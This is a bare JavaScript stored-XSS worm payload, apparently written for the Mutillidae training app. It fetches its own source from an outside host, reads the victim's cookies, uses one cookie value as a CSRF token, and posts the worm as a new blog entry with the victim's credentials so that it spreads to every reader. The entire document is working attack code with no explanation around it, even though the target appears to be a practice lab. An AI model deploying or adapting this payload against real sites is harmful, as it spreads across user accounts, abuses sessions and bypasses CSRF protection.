<script>

 	var text = \'\';

 	var xmlhttp;
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
        	text = escape(xmlhttp.responseText);
        }
    }
    xmlhttp.open(\'GET\', \'http://localhost:8888/xss/jsworm.php\', false);
    xmlhttp.send(null);

 	var theCookies = document.cookie.split(\';\');
 	var sessionid = theCookies[2];
    var params = \'blog_entry=\';
    params = params.concat(text);
    var reqBody = \'&add-to-your-blog-php-submit-button=Save+Blog+Entry&csrf-token=\';
    params = params.concat(reqBody);
    params = params.concat(sessionid);
    var http = new XMLHttpRequest();
    http.open(\'POST\', \'http:\/\/192.168.176.128\/mutillidae\/index.php?page=add-to-your-blog.php\', true);
    http.withCredentials = true;
    http.setRequestHeader(\'Content-type\', \'application/x-www-form-urlencoded\');
    http.setRequestHeader(\'Content-length\', params.length);
    http.setRequestHeader(\'Connection\', \'close\');
    http.send(params);

 </script>